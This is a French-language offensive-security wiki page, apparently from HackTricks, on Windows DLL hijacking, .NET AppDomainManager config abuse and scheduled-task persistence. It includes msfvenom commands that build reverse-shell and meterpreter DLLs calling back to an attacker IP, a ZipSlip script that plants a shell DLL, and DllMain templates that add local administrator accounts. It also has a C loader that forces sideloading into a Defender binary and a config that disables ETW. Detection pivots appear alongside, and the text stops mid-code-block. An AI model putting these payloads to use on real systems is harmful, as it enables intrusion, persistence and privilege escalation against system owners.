# DLL Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Informations de base

DLL Hijacking consiste à manipuler une application de confiance afin qu'elle charge une DLL malveillante. Ce terme englobe plusieurs tactiques comme le **DLL Spoofing, l'Injection et le Side-Loading**. Il est principalement utilisé pour l'exécution de code, la mise en place de persistence et, plus rarement, l'escalade de privilèges. Malgré l'accent mis ici sur l'escalade, la méthode de hijacking reste la même, quels que soient les objectifs.

### Techniques courantes

Plusieurs méthodes sont utilisées pour le DLL hijacking, chacune ayant une efficacité qui dépend de la stratégie de chargement des DLL de l'application :<sup>[[4]](#references)</sup>

1. **DLL Replacement** : remplacer une DLL légitime par une DLL malveillante, éventuellement en utilisant le DLL Proxying pour préserver les fonctionnalités de la DLL originale.
2. **DLL Search Order Hijacking** : placer la DLL malveillante dans un chemin de recherche prioritaire par rapport à la DLL légitime, en exploitant le modèle de recherche de l'application.
3. **Phantom DLL Hijacking** : créer une DLL malveillante qu'une application chargera, en pensant qu'il s'agit d'une DLL requise inexistante.
4. **DLL Redirection** : modifier des paramètres de recherche comme `%PATH%` ou les fichiers `.exe.manifest` / `.exe.local` afin de rediriger l'application vers la DLL malveillante.
5. **WinSxS DLL Replacement** : remplacer la DLL légitime par une version malveillante dans le répertoire WinSxS, une méthode souvent associée au DLL side-loading.
6. **Relative Path DLL Hijacking** : placer la DLL malveillante dans un répertoire contrôlé par l'utilisateur avec l'application copiée, ce qui ressemble aux techniques de Binary Proxy Execution.

{{#ref}}
windows-cpython-build-landmark-sys-path-hijacking.md
{{#endref}}


### AppDomainManager hijacking (`<exe>.config` + assembly de l'attaquant)

Le DLL sideloading classique n'est pas la seule manière de faire charger du code d'attaquant par un processus **.NET Framework** de confiance. Si l'exécutable cible est une application **managed**, le CLR consulte également un fichier de configuration d'application portant le nom de l'exécutable (par exemple `Setup.exe.config`). Ce fichier peut définir un **AppDomainManager** personnalisé. Si la configuration pointe vers une assembly contrôlée par l'attaquant et placée à côté de l'EXE, le CLR la charge **avant le chemin d'exécution normal de l'application** et l'exécute au sein du processus de confiance.<sup>[[24]](#references)</sup>

Selon le schéma de configuration .NET Framework de Microsoft, `<appDomainManagerAssembly>` et `<appDomainManagerType>` doivent tous deux être présents pour que le manager personnalisé soit utilisé.<sup>[[16]](#references)[[17]](#references)</sup>

Configuration minimale :
```xml
<configuration>
<runtime>
<appDomainManagerAssembly value="EvilMgr, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" />
<appDomainManagerType value="EvilMgr.Loader" />
</runtime>
</configuration>
```
Gestionnaire minimal :
```csharp
using System; using System.Runtime.InteropServices;
public sealed class Loader : AppDomainManager {
[DllImport("user32.dll")] static extern int MessageBox(IntPtr h, string t, string c, int m);
public override void InitializeNewDomain(AppDomainSetup appDomainInfo) {
MessageBox(IntPtr.Zero, "Loaded inside trusted .NET host", "AppDomain hijack", 0);
}
}
```
Notes pratiques :
- Il s’agit d’un tradecraft spécifique à **.NET Framework**. Il dépend de l’analyse de la configuration du CLR, et non de l’ordre de recherche des DLL Win32.
- L’hôte doit réellement être un **EXE managé**. Triage rapide : `sigcheck -m target.exe`, `corflags target.exe`, ou vérifiez la présence du **CLR Runtime Header** dans les métadonnées PE.
- Le nom du fichier de configuration doit correspondre exactement au nom de l’exécutable (`<binary>.config`) et se trouve généralement **à côté de l’EXE**.
- Cette technique est utile avec des binaires **Microsoft/vendor signés**, car l’EXE de confiance reste inchangé tandis que l’assembly managé malveillant s’exécute in-process.
- Si vous disposez déjà d’un répertoire d’installation/de mise à jour accessible en écriture, le détournement d’AppDomainManager peut servir de **première étape**, suivi d’un DLL sideloading classique ou d’un reflective loading pour les étapes suivantes.

### AppDomainManager comme downloader + bootstrap de scheduled task

Un schéma d’intrusion pratique consiste à associer l’EXE managé de confiance à un `*.config` malveillant et à une DLL AppDomainManager malveillante qui agit uniquement comme un **petit bootstrapper** :<sup>[[25]](#references)</sup>

1. L’utilisateur lance un installeur ou updater .NET signé depuis un emplacement crédible tel que `%USERPROFILE%\Downloads`.
2. La configuration adjacente force le CLR à charger l’assembly de l’attaquant **avant** le démarrage de la logique légitime de l’application.
3. Le manager malveillant effectue un **path gate** (par exemple, continuer uniquement si l’EXE hôte s’exécute depuis `Downloads`, et n’autoriser l’exécution de la seconde étape que depuis `%LOCALAPPDATA%`).
4. Si la vérification réussit, il télécharge le payload réel dans un chemin accessible en écriture par l’utilisateur, tel que `%LOCALAPPDATA%\PerfWatson2.exe`, et établit la persistence avec une tâche planifiée.

Pourquoi cette variante est importante :
- L’EXE hôte signé reste inchangé ; un triage qui ne calcule le hash que du binaire principal peut donc ne pas détecter la compromission.
- Une **anti-analyse basée sur les chemins** est courante : déplacer le trio ZIP/EXE/DLL vers le Bureau, Temp ou un chemin de sandbox peut intentionnellement interrompre la chaîne.
- La DLL AppDomainManager de première étape peut rester minuscule et discrète tandis que le véritable implant est récupéré ultérieurement.

Exemple minimal de persistence fréquemment observé avec ce schéma :
```cmd
schtasks /create /tn "GoogleUpdaterTaskSystem140.0.7272.0" /sc onlogon /tr "%LOCALAPPDATA%\PerfWatson2.exe" /rl highest /f
```
Notes :
- ` /rl highest` signifie **highest available** pour cet utilisateur/cette session ; il ne garantit pas à lui seul une escalation vers SYSTEM.
- Cette technique est souvent mieux catégorisée comme **execution/persistence via .NET config abuse** que comme un classic missing-DLL search-order hijacking, même si les opérateurs enchaînent fréquemment les deux.

Pivots de détection :
- Executables .NET signés lancés depuis des **ZIP extraction paths**, `Downloads`, `%TEMP%` ou d'autres dossiers accessibles en écriture par l'utilisateur, avec un `<exe>.config` **colocalisé**.
- Nouvelles tâches planifiées dont l'action pointe vers `%LOCALAPPDATA%`, `%APPDATA%` ou `Downloads`, et dont les noms imitent ceux de browser/vendor updaters.
- Processus bootstrap managés de courte durée qui téléchargent immédiatement un autre EXE, puis lancent `schtasks.exe`.
- Samples qui se terminent prématurément sauf si le chemin de l'executable correspond à un répertoire attendu du profil utilisateur.

### Hijacking d'une tâche planifiée existante pour relancer la sideload chain

Pour la persistence, ne recherchez pas uniquement la **création d'une nouvelle tâche**. Certains intrusion sets attendent qu'un installateur légitime crée une **tâche d'updater normale**, puis **réécrivent l'action de la tâche** afin que le nom, l'auteur et le trigger existants restent familiers aux defenders.

Workflow réutilisable :
1. Installer/lancer le logiciel légitime et identifier la tâche qu'il crée normalement.
2. Exporter le XML de la tâche et relever les valeurs actuelles de `<Exec><Command>` / `<Arguments>`.<sup>[[23]](#references)</sup>
3. Remplacer uniquement l'action afin que la tâche lance votre **trusted host EXE** depuis un répertoire de staging accessible en écriture par l'utilisateur, lequel effectue ensuite un sideload ou un AppDomain-load du payload réel.
4. Réenregistrer le même nom de tâche au lieu de créer un nouvel artefact de persistence évident.
```cmd
schtasks /query /tn "<TaskName>" /xml > task.xml
:: edit the <Exec><Command> and optional <Arguments> nodes
schtasks /create /tn "<TaskName>" /xml task.xml /f
```
Pourquoi c'est plus furtif :
- Le nom de la tâche peut toujours sembler légitime (par exemple, celui d'un updater d'un fournisseur).
- Le service **Task Scheduler** la lance, de sorte que la validation du parent/des ancêtres voit souvent la chaîne de planification attendue au lieu de `explorer.exe`.
- Les équipes DFIR qui recherchent uniquement les **nouveaux noms de tâches** peuvent manquer une tâche dont l'enregistrement existait déjà, mais dont l'action pointe désormais vers `%LOCALAPPDATA%`, `%APPDATA%` ou un autre chemin contrôlé par l'attaquant.

Pivots de hunting rapides :
- `schtasks /query /fo LIST /v | findstr /i "TaskName Task To Run"`
- `Get-ScheduledTask | % { [pscustomobject]@{TaskName=$_.TaskName; TaskPath=$_.TaskPath; Exec=($_.Actions | % Execute)} }`
- Comparez le XML de `C:\Windows\System32\Tasks\*` et les métadonnées de `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\*` avec une baseline.
- Déclenchez une alerte lorsqu'une **tâche d'updater ressemblant à celle d'un fournisseur** s'exécute depuis des **répertoires accessibles en écriture par l'utilisateur** ou lance un EXE .NET avec un fichier `*.config` placé à côté.

> [!TIP]
> Pour une chaîne détaillée étape par étape combinant du staging HTML, des configurations AES-CTR et des implants .NET avec du DLL sideloading, consultez le workflow ci-dessous.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## Trouver les DLL manquantes

La manière la plus courante de trouver les DLL manquantes dans un système consiste à exécuter [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) de sysinternals, en **définissant** les **2 filtres suivants** :

![Techniques courantes - Trouver les DLL manquantes : La manière la plus courante de trouver les DLL manquantes dans un système consiste à exécuter procmon de sysinternals, en définissant les 2 filtres suivants](<../../../images/image (961).png>)

![Techniques courantes - Trouver les DLL manquantes : La manière la plus courante de trouver les DLL manquantes dans un système consiste à exécuter procmon de sysinternals, en définissant les 2 filtres suivants](<../../../images/image (230).png>)

et afficher uniquement la **File System Activity** :

![Techniques courantes - Trouver les DLL manquantes : et afficher uniquement la File System Activity](<../../../images/image (153).png>)

Si vous recherchez des **DLL manquantes en général**, **laissez** cet outil s'exécuter pendant quelques **secondes**.\
Si vous recherchez une **DLL manquante dans un exécutable spécifique**, définissez un autre filtre, par exemple **"Process Name" "contains" `<exec name>`**, exécutez-le, puis arrêtez la capture des événements.<sup>[[9]](#references)</sup>

## Exploiter les DLL manquantes

Pour élever vos privilèges, recherchez une **DLL qu'un processus privilégié tente de charger** depuis un emplacement dans lequel vous pouvez écrire. Cela peut se produire lorsque vous contrôlez un répertoire recherché avant celui contenant la DLL légitime, ou lorsque la DLL demandée n'existe pas et que vous pouvez écrire dans l'un des répertoires recherchés.

### Ordre de recherche des DLL

**Dans la** [**documentation Microsoft**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching), **vous pouvez trouver comment les DLL sont chargées précisément.**

Les **applications Windows** recherchent les DLL en suivant un ensemble de **chemins de recherche prédéfinis**, selon une séquence particulière. Le problème du DLL hijacking survient lorsqu'une DLL malveillante est placée stratégiquement dans l'un de ces répertoires, afin qu'elle soit chargée avant la DLL authentique. Pour éviter cela, l'application doit utiliser des chemins absolus lorsqu'elle fait référence aux DLL dont elle a besoin.

Vous pouvez voir ci-dessous **l'ordre de recherche des DLL sur les systèmes 32 bits** :

1. Le répertoire depuis lequel l'application a été chargée.
2. Le répertoire système. Utilisez la fonction [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) pour obtenir le chemin de ce répertoire.(_C:\Windows\System32_)
3. Le répertoire système 16 bits. Il n'existe aucune fonction permettant d'obtenir le chemin de ce répertoire, mais il est recherché. (_C:\Windows\System_)
4. Le répertoire Windows. Utilisez la fonction [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) pour obtenir le chemin de ce répertoire.
1. (_C:\Windows_)
5. Le répertoire actuel.
6. Les répertoires listés dans la variable d'environnement PATH. Notez que cela n'inclut pas le chemin par application spécifié par la clé de registre **App Paths**. La clé **App Paths** n'est pas utilisée lors du calcul du chemin de recherche des DLL.

Il s'agit de l'ordre de recherche **par défaut**, avec **SafeDllSearchMode** activé. Lorsqu'il est désactivé, le répertoire actuel passe en deuxième position. Pour désactiver cette fonctionnalité, créez la valeur de registre **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** et définissez-la sur 0 (elle est activée par défaut).

Si la fonction [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) est appelée avec **LOAD_WITH_ALTERED_SEARCH_PATH**, la recherche commence dans le répertoire du module exécutable que **LoadLibraryEx** charge.

Enfin, une DLL peut être chargée par chemin absolu plutôt que par son nom. Dans ce cas, Windows recherche la DLL elle-même uniquement à cet emplacement ; les dépendances demandées par leur nom suivent toutefois l'ordre de recherche applicable.

Il existe d'autres manières de modifier l'ordre de recherche, mais je ne vais pas les expliquer ici.

### Enchaîner une écriture arbitraire de fichier avec un hijack de DLL manquante

1. Utilisez les filtres **ProcMon** (`Process Name` = EXE cible, `Path` se terminant par `.dll`, `Result` = `NAME NOT FOUND`) pour collecter les noms de DLL que le processus tente de trouver sans succès.<sup>[[14]](#references)</sup>
2. Si le binaire s'exécute selon une **planification ou en tant que service**, déposer une DLL portant l'un de ces noms dans le **répertoire de l'application** (entrée n° 1 de l'ordre de recherche) entraînera son chargement lors de la prochaine exécution. Dans le cas d'un scanner .NET, le processus recherchait `hostfxr.dll` dans `C:\samples\app\` avant de charger la copie réelle depuis `C:\Program Files\dotnet\fxr\...`.
3. Créez une DLL de payload (par exemple, un reverse shell) avec n'importe quel export : `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f dll -o hostfxr.dll`.
4. Si votre primitive est une **écriture arbitraire de type ZipSlip**, créez un ZIP dont l'entrée sort du répertoire d'extraction afin que la DLL soit déposée dans le dossier de l'application :
```python
import zipfile
with zipfile.ZipFile("slip-shell.zip", "w") as z:
z.writestr("../app/hostfxr.dll", open("hostfxr.dll","rb").read())
```
5. Livrez l’archive dans l’inbox/share surveillée ; lorsque la tâche planifiée relance le processus, celui-ci charge la DLL malveillante et exécute votre code avec le compte de service.

### Forcing sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath

Une méthode avancée permettant d’influencer de manière déterministe le chemin de recherche des DLL d’un processus nouvellement créé consiste à définir le champ DllPath dans RTL_USER_PROCESS_PARAMETERS lors de la création du processus avec les API natives de ntdll. En fournissant ici un répertoire contrôlé par l’attaquant, un processus cible qui résout une DLL importée par son nom (sans chemin absolu et sans utiliser les indicateurs de chargement sécurisé) peut être forcé à charger une DLL malveillante depuis ce répertoire.

Key idea
- Construisez les paramètres du processus avec RtlCreateProcessParametersEx et fournissez un DllPath personnalisé pointant vers votre dossier contrôlé (par exemple, le répertoire où se trouvent votre dropper/unpacker).
- Créez le processus avec RtlCreateUserProcess. Lorsque le binaire cible résout une DLL par son nom, le loader consulte le DllPath fourni lors de la résolution, ce qui permet un sideloading fiable même lorsque la DLL malveillante ne se trouve pas dans le même répertoire que l’EXE cible.

Notes/limitations
- Cela affecte le processus enfant en cours de création ; c’est différent de SetDllDirectory, qui affecte uniquement le processus actuel.
- La cible doit importer ou charger avec LoadLibrary une DLL par son nom (sans chemin absolu et sans utiliser LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- Les KnownDLLs et les chemins absolus codés en dur ne peuvent pas être hijackés. Les exports transférés et SxS peuvent modifier la précédence.

Minimal C example (ntdll, wide strings, simplified error handling):

<details>
<summary>Full C example: forcing DLL sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

Exemple d'utilisation opérationnelle
- Placez un xmllite.dll malveillant (exportant les fonctions requises ou servant de proxy vers le fichier réel) dans votre répertoire DllPath.
- Lancez un binaire signé connu pour rechercher xmllite.dll par son nom en utilisant la technique ci-dessus. Le loader résout l'import via le DllPath fourni et effectue le sideload de votre DLL.

Cette technique a été observée dans la nature pour mettre en œuvre des chaînes de sideloading en plusieurs étapes : un launcher initial dépose une DLL auxiliaire, qui lance ensuite un binaire signé par Microsoft et vulnérable au hijacking avec un DllPath personnalisé afin de forcer le chargement de la DLL de l'attaquant depuis un répertoire de staging.<sup>[[6]](#references)</sup>


### AppDomainManager hijacking via `.exe.config`

Pour les cibles **.NET Framework**, le sideloading peut être effectué **avant `Main()`** sans patcher la mémoire, en exploitant le fichier **`.exe.config`** adjacent de l'application. Au lieu de dépendre uniquement de l'ordre de recherche des DLL Win32, l'attaquant place un EXE .NET légitime à côté d'un fichier de configuration malveillant et d'un ou plusieurs assemblies contrôlés par l'attaquant.

Fonctionnement de la chaîne :<sup>[[15]](#references)[[22]](#references)</sup>
1. L'EXE hôte démarre et le **CLR lit `<exe>.config`**.
2. La configuration définit **`<appDomainManagerAssembly>`** et **`<appDomainManagerType>`**, afin que le runtime instancie un `AppDomainManager` contrôlé par l'attaquant.
3. Le manager malveillant obtient une **exécution pré-`Main()`** au sein du processus hôte de confiance.
4. La même configuration peut forcer le CLR à résoudre en premier les assemblies locaux (par exemple `InitInstall.dll`, `Updater.dll`, `uevmonitor.dll`) et peut affaiblir la validation et la télémétrie du runtime sans patching inline.

Modèle de type campagne (l'imbrication exacte peut varier selon la directive / la version du CLR) :
```xml
<configuration>
<runtime>
<appDomainManagerAssembly value="Updater" />
<appDomainManagerType value="MyAppDomainManager" />
<assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
<probing privatePath="." />
<publisherPolicy apply="no" />
</assemblyBinding>
<bypassTrustedAppStrongNames enabled="true" />
<etwEnable enabled="false" />
</runtime>
<startup>
<requiredRuntime version="v4.0.30319" safemode="true" />
</startup>
</configuration>
```
Pourquoi c'est utile :
- **`<probing privatePath="."/>`** maintient la résolution des assemblies dans le répertoire de l'application, transformant ainsi le dossier en surface de sideloading prévisible.<sup>[[18]](#references)</sup>
- **`<appDomainManagerAssembly>` + `<appDomainManagerType>`** déplacent l'exécution vers le code de l'attaquant pendant l'initialisation du CLR, avant l'exécution de la logique légitime de l'application.<sup>[[16]](#references)[[17]](#references)</sup>
- **`<bypassTrustedAppStrongNames enabled="true"/>`** peut permettre à une application full-trust de charger des assemblies non signés ou altérés sans échec de validation du strong name.<sup>[[19]](#references)</sup>
- **`<publisherPolicy apply="no"/>`** évite les redirections de publisher policy vers des assemblies plus récents.<sup>[[20]](#references)</sup>
- **`<requiredRuntime ... safemode="true"/>`** rend la sélection du runtime plus déterministe.<sup>[[21]](#references)</sup>
- **`<etwEnable enabled="false"/>`** est particulièrement intéressant, car le **CLR désactive sa propre visibilité ETW** depuis la configuration au lieu que l'implant ne patche `EtwEventWrite` en mémoire.

Schéma opérationnel observé dans des campagnes récentes :
- L'étape 1 dépose `setup.exe`, `setup.exe.config` et des assemblies locaux.
- L'étape 2 les copie dans un dossier **AppData update** crédible, renomme l'hôte en quelque chose comme `update.exe`, puis le relance via une **scheduled task**.
- L'étape 3 vérifie le contexte d'exécution (par exemple le parent attendu `svchost.exe` provenant de Task Scheduler) avant de charger la DLL/export RAT final.

Idées pour le hunting :
- Des **exécutables .NET** signés ou autrement légitimes s'exécutant avec des fichiers **`.config`** adjacents suspects dans des emplacements accessibles en écriture par les utilisateurs.
- Des fichiers `.config` contenant **`appDomainManagerAssembly`**, **`appDomainManagerType`**, **`probing privatePath="."`**, **`bypassTrustedAppStrongNames`** ou **`etwEnable enabled="false"`**.
- Des tâches planifiées qui relancent des binaires update renommés depuis **`%LOCALAPPDATA%`** ou des répertoires spécifiques à l'application `\bin\update\`.
- Des chaînes parent/enfant dans lesquelles une tâche planifiée lance un hôte .NET de confiance qui charge immédiatement des assemblies ne provenant pas de l'éditeur depuis son propre répertoire.

#### Exceptions concernant l'ordre de recherche des DLL d'après la documentation Windows

Certaines exceptions à l'ordre standard de recherche des DLL sont mentionnées dans la documentation Windows :

- Lorsqu'une **DLL qui porte le même nom qu'une DLL déjà chargée en mémoire** est rencontrée, le système contourne la recherche habituelle. Il vérifie plutôt la redirection et un manifeste avant d'utiliser par défaut la DLL déjà présente en mémoire. **Dans ce scénario, le système n'effectue pas de recherche de la DLL**.
- Lorsque la DLL est reconnue comme une **known DLL** pour la version actuelle de Windows, le système utilise sa version de la known DLL, ainsi que toutes ses DLL dépendantes, **sans effectuer la recherche**. La clé de registre **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** contient la liste de ces known DLLs.
- Si une **DLL possède des dépendances**, la recherche de ces DLL dépendantes est effectuée comme si elles étaient indiquées uniquement par leur **module name**, même si la DLL initiale a été identifiée à l'aide d'un chemin complet.

### Escalade des privilèges

**Prérequis** :

- Identifier un processus qui s'exécute ou s'exécutera avec des **privilèges différents** (mouvement horizontal ou latéral) et auquel il manque une DLL.
- S'assurer qu'un **accès en écriture** est disponible pour tout **répertoire** dans lequel la **DLL** sera **recherchée**. Il peut s'agir du répertoire de l'exécutable ou d'un répertoire du chemin système.

Ces prérequis sont rarement réunis par défaut : les exécutables privilégiés n'ont généralement pas de dépendances DLL manquantes, et les utilisateurs standard ne peuvent normalement pas écrire dans les répertoires du chemin de recherche système. Des environnements mal configurés peuvent toutefois exposer ces deux conditions.\
Si les prérequis sont réunis, consultez le projet [UACME](https://github.com/hfiref0x/UACME). Bien que son objectif principal soit le UAC bypass, il contient des PoCs de DLL-hijacking pour certaines versions de Windows, qui peuvent souvent être adaptés au répertoire accessible en écriture que vous avez trouvé.

Notez que vous pouvez **vérifier vos permissions dans un dossier** avec :<sup>[[5]](#references)</sup>
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
Et **vérifiez les permissions de tous les dossiers dans PATH** :
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Vous pouvez également vérifier les imports d’un exécutable et les exports d’une DLL avec :
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
Pour obtenir un guide complet sur la manière d'**abuse DLL Hijacking to escalate privileges** avec des permissions d'écriture dans un dossier du **System Path**, consultez :


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Outils automatisés

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) vérifiera si vous disposez de permissions d'écriture sur un dossier situé dans le System PATH.\
D'autres outils automatisés intéressants pour découvrir cette vulnérabilité sont les **fonctions PowerSploit** : _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ et _Write-HijackDll._

### Exemple

Si vous trouvez un scénario exploitable, l'un des éléments les plus importants pour réussir à l'exploiter serait de **créer une dll qui exporte au moins toutes les fonctions que l'exécutable importera depuis celle-ci**. Quoi qu'il en soit, notez que DLL Hijacking est utile pour [**escalate from Medium Integrity level to High (bypassing UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) ou de[ **High Integrity to SYSTEM**](../index.html#from-high-integrity-to-system)**.** Vous trouverez un exemple expliquant **how to create a valid dll** dans cette étude sur DLL Hijacking axée sur le DLL Hijacking pour l'exécution : [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
De plus, dans la **section suivante**, vous trouverez quelques **basic dll codes** qui pourraient être utiles comme **templates** ou pour créer une **dll with non required functions exported**.

## **Creating and compiling DLLs**

### **DLL Proxifying**

En principe, un **DLL proxy** est une DLL capable d'**execute your malicious code when loaded**, mais également d'**expose** et de **work** comme prévu en **relaying all the calls to the real library**.

Avec l'outil [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) ou [**Spartacus**](https://github.com/Accenture/Spartacus), vous pouvez effectivement **indicate an executable and select the library** que vous souhaitez proxifier, puis **generate a proxified dll**, ou **indicate the DLL** et **generate a proxified dll**.

### **Meterpreter**

**Get rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Obtenir un meterpreter (x86) :**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Créer un utilisateur (x86, je n'ai pas vu de version x64) :**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### La vôtre

Dans de nombreux cas, la DLL que vous compilez doit **exporter chaque fonction importée par le processus victime**. Si un export requis est manquant, le binaire ne peut pas le résoudre et l’exploit échoue.

<details>
<summary>Modèle de DLL C (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>Exemple de DLL C++ avec création d’utilisateur</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>DLL C alternative avec point d’entrée de thread</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## Étude de cas : Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)

Windows Narrator.exe recherche toujours au démarrage une DLL de localisation prévisible et spécifique à la langue, qui peut être détournée pour exécuter du code arbitraire et assurer la persistance.<sup>[[7]](#references)</sup>

Faits essentiels
- Chemin sondé (builds actuels) : `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Chemin legacy (anciens builds) : `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- Si une DLL contrôlée par l’attaquant et accessible en écriture existe à l’emplacement OneCore, elle est chargée et `DllMain(DLL_PROCESS_ATTACH)` s’exécute. Aucun export n’est requis.

Découverte avec Procmon
- Filtre : `Process Name is Narrator.exe` et `Operation is Load Image` ou `CreateFile`.
- Démarrez Narrator et observez le chargement tenté du chemin ci-dessus.

DLL minimale
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
